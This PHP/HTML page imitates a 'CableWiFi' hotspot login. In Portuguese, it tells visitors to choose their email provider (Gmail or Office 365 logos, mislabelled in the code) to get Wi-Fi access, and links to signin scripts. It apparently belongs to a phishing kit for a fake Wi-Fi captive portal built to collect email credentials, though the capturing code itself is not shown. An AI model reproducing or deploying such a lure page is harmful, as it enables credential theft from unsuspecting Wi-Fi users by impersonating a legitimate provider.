<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en-US" class="">
  
<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" />
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>CableWiFi&trade;</title>
    <meta name="description" content="">

    <!-- Favicon metadata, place favicon.ico in the root directory -->
    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon2791.png?v=A0eBo0aEAx">
    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x322791.png?v=A0eBo0aEAx">
    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x162791.png?v=A0eBo0aEAx">
    <link rel="manifest" href="assets/images/manifest2791.json?v=A0eBo0aEAx">
    <link rel="mask-icon" href="assets/images/safari-pinned-tab2791.svg?v=A0eBo0aEAx" color="#5bbad5">
    <link rel="shortcut icon" href="favicon2791.html?v=A0eBo0aEAx">
    <meta name="theme-color" content="#ffffff">

    <!-- Prevent iOS from detecting phone numbers and adding their own link and style -->
    <meta name="format-detection" content="telephone=no">

    <link rel="stylesheet" href="assets/css/app.css">
  </head>

  <body>
    <div id="myApp">

      <!--[if IE]>
      <p class="browserupgrade">Você está usando um browser desatualizado. Por favor atualize-o</a> para melhorar sua experiência.</p>
      <![endif]-->

      <main class="main-container cw-container cw-toolbar-fixed-adjust" role="main">
        <header role="banner">
          <h1>Olá!</h1>
          <p>Para usar o Wi-Fi, selecione o seu provedor de e-mail.</p>
        </header>
        <ul class="provider-list">
          <li><a class="cw-card" href="signince44.php?mso=cox"><img class="cox-logo" src="assets/images/google-logo.png" alt="Gmail"></a></li>
          <li><a class="cw-card" href="signin8d07.php?mso=cvc"><img class="optimum-logo" src="assets/images/office-365-logo.png" alt="Optimum"></a></li>
        </ul>
      </main>
    </div><!-- /#myApp -->

	<!--Omniture Tag -->
	<script type = 'text/javascript'>
		 var omniture_account = 'cablevisionwifi'; //set omniture report suite
	</script>
	
	<div id="HeaderChannel" style="display:none;">WIFI Sign In</div>
	<div id="LeftMenuLevels" style="display:none;">CableWIFI - Home</div> 
	<script type="text/javascript" src="assets/js/omniture/1.js"></script>
	<!--End Omniture Tag -->
	
    <!-- Vue Library -->
    <script src="assets/js/vue.js"></script>

    <!-- Application scripts bundle -->
    <script src="assets/js/app.js"></script>

  </body>
</html>